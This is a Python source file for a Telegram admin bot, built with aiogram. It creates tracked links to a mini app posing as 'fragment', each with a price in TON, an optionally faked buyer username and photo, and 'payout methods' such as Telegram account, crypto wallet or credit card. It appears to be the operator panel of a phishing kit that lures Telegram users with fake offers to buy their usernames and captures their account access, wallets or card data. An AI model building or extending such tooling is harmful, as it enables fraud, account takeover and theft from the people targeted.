import os
import asyncio
import json
import uuid
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.client.session.aiohttp import AiohttpSession
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("ADMIN_BOT_TOKEN")
PASSWORD = os.getenv("ADMIN_PASSWORD")
MINI_APP_USERNAME = os.getenv("MINI_APP_USERNAME", "selling")
DOMAIN = os.getenv("DOMAIN")

# Use default session; custom timeout is handled in polling
bot = Bot(token=TOKEN)
dp = Dispatcher()

# States for link generation
class LinkGen(StatesGroup):
    choosing_type = State()
    entering_price = State()
    entering_username = State()
    entering_pfp = State()
    choosing_methods = State()

AUTHORIZED_ADMINS = set()
GENERATED_LINKS = {}

def save_admins():
    with open("admins.json", "w") as f:
        json.dump(list(AUTHORIZED_ADMINS), f)

def load_data():
    global AUTHORIZED_ADMINS, GENERATED_LINKS
    if os.path.exists("admins.json"):
        with open("admins.json", "r") as f:
            AUTHORIZED_ADMINS = set(json.load(f))
    if os.path.exists("links.json"):
        with open("links.json", "r") as f:
            GENERATED_LINKS = json.load(f)

load_data()

def get_admin_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🚀 Generate Link")],
            [KeyboardButton(text="📊 View Links"), KeyboardButton(text="⚙️ Settings")]
        ],
        resize_keyboard=True
    )

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.from_user.id in AUTHORIZED_ADMINS:
        await message.answer("Welcome back, Admin!", reply_markup=get_admin_kb())
    else:
        await message.answer("Please enter the password to access admin features.")

@dp.message(F.text == PASSWORD)
async def handle_password(message: types.Message):
    AUTHORIZED_ADMINS.add(message.from_user.id)
    save_admins()
    await message.answer("✅ Success! You are now an authorized admin.", reply_markup=get_admin_kb())

@dp.message(F.text == "🚀 Generate Link")
async def start_gen(message: types.Message, state: FSMContext):
    if message.from_user.id not in AUTHORIZED_ADMINS: return
    await state.clear()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🤖 Automated (Visitor Info)", callback_data="type_auto")],
        [InlineKeyboardButton(text="✏️ Custom (Manual Info)", callback_data="type_custom")]
    ])
    await message.answer("Select link type:", reply_markup=kb)
    await state.set_state(LinkGen.choosing_type)

@dp.message(F.text == "📊 View Links")
async def view_links(message: types.Message):
    if message.from_user.id not in AUTHORIZED_ADMINS: return
    if not GENERATED_LINKS:
        await message.answer("No links generated yet.")
        return

    mini_app_username = os.getenv("MINI_APP_USERNAME", "selling")
    text = "📂 *Generated Links:*\n\n"
    for lid, data in list(GENERATED_LINKS.items())[-10:]: # Show last 10
        link = f"https://t.me/{mini_app_username}/fragment?startapp={lid}"
        text += f"• `{lid}`: {data['price']} TON ({data['type']})\n🔗 {link}\n\n"

    await message.answer(text, parse_mode="Markdown", disable_web_page_preview=True)

@dp.message(F.text == "⚙️ Settings")
async def settings(message: types.Message):
    if message.from_user.id not in AUTHORIZED_ADMINS: return
    await message.answer("⚙️ *Settings*\n\nCurrent Mini App: `@selling`\nDomain: `https://smskenya.net`", parse_mode="Markdown")

@dp.callback_query(F.data.startswith("type_"), StateFilter(LinkGen.choosing_type))
async def select_type(callback: types.CallbackQuery, state: FSMContext):
    ltype = callback.data.split("_")[1]
    await state.update_data(type=ltype)
    await callback.message.edit_text("Enter price in TON (e.g., 382):")
    await state.set_state(LinkGen.entering_price)

@dp.message(StateFilter(LinkGen.entering_price))
async def enter_price(message: types.Message, state: FSMContext):
    await state.update_data(price=message.text)
    data = await state.get_data()
    if data['type'] == 'custom':
        await message.answer("Enter username (without @):")
        await state.set_state(LinkGen.entering_username)
    else:
        await ask_methods(message, state)

@dp.message(StateFilter(LinkGen.entering_username))
async def enter_username(message: types.Message, state: FSMContext):
    await state.update_data(username=message.text)
    await message.answer("Enter Profile Picture URL:")
    await state.set_state(LinkGen.entering_pfp)

@dp.message(StateFilter(LinkGen.entering_pfp))
async def enter_pfp(message: types.Message, state: FSMContext):
    await state.update_data(pfp=message.text)
    await ask_methods(message, state)

async def ask_methods(message: types.Message, state: FSMContext):
    await state.update_data(methods=[])
    kb = get_methods_kb([])
    await message.answer("Select allowed payout methods (click to toggle):", reply_markup=kb)
    await state.set_state(LinkGen.choosing_methods)

def get_methods_kb(selected):
    def get_label(m, label): return f"✅ {label}" if m in selected else label
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_label("telegram", "Telegram Account"), callback_data="toggle_telegram")],
        [InlineKeyboardButton(text=get_label("wallet", "Crypto Wallet"), callback_data="toggle_wallet")],
        [InlineKeyboardButton(text=get_label("card", "Credit Card"), callback_data="toggle_card")],
        [InlineKeyboardButton(text="✨ Finish & Create", callback_data="finish_gen")]
    ])

@dp.callback_query(F.data.startswith("toggle_"), StateFilter(LinkGen.choosing_methods))
async def toggle_method(callback: types.CallbackQuery, state: FSMContext):
    method = callback.data.split("_")[1]
    data = await state.get_data()
    methods = data.get('methods', [])
    if method in methods: methods.remove(method)
    else: methods.append(method)
    await state.update_data(methods=methods)
    await callback.message.edit_reply_markup(reply_markup=get_methods_kb(methods))

@dp.callback_query(F.data == "finish_gen", StateFilter(LinkGen.choosing_methods))
async def finish_gen(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    link_id = str(uuid.uuid4())[:8]

    # If no methods selected, default to all
    methods = data.get('methods', [])
    if not methods: methods = ["telegram", "wallet", "card"]

    link_data = {
        "type": data['type'],
        "price": data['price'],
        "methods": methods
    }
    if data['type'] == 'custom':
        link_data.update({"username": data['username'], "pfp": data['pfp']})

    GENERATED_LINKS[link_id] = link_data
    with open("links.json", "w") as f:
        json.dump(GENERATED_LINKS, f)

    mini_app_username = os.getenv("MINI_APP_USERNAME", "selling")
    link = f"https://t.me/{mini_app_username}/fragment?startapp={link_id}"

    await callback.message.edit_text(f"✅ Link Generated!\n\nLink: `{link}`", parse_mode="Markdown")
    await state.clear()

async def main():
    print("Admin Bot starting...")
    while True:
        try:
            # Set explicit polling timeout for VPS stability
            await dp.start_polling(bot, polling_timeout=30)
        except Exception as e:
            print(f"Polling error: {e}. Retrying...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
